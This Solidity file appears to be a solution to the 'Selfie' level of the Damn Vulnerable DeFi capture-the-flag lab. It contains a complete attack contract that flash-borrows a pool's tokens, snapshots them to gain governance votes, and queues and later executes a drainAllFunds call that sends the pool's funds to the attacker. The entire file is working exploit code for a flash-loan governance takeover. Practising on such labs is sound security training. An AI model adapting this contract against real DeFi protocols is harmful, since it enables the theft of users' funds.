pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract SelfieAttack {
    DamnValuableTokenSnapshot immutable public targetToken;
    SimpleGovernance immutable public targetGovernance;
    SelfiePool immutable public targetPool;
    address immutable owner;
    uint256 actionId;
    uint256 public actionPlantedAt;
    uint256 public AWAIT_TIME = 2 days;
    constructor (DamnValuableTokenSnapshot token,SimpleGovernance governance,SelfiePool pool){
        targetToken = token;
        targetGovernance = governance;
        targetPool = pool;
        owner = msg.sender;
    }
    //attack has two parts:
    // 1)Put the action in the queue.(Flash loan used here) Await 2 days.
    // 2)Execute the action.

    //execute the bomb.
    //act:1
    function finalize() public { 
        require(block.timestamp - actionPlantedAt >= AWAIT_TIME,"Await for the correct time");
        targetGovernance.executeAction(actionId);
    }

    //act:0
    function start() public{
        uint256 amount = targetToken.balanceOf(address(targetPool));
        targetPool.flashLoan(amount);
    }

    //bomb has been planted
    function receiveTokens(address tokenAddress,uint256 amount) external {
        targetToken.snapshot();
        actionPlantedAt = block.timestamp;
        actionId = targetGovernance.queueAction(
            address(targetPool), 
            abi.encodeWithSignature("drainAllFunds(address)",owner),
            0
        );
        targetToken.transfer(msg.sender, amount);
    }

}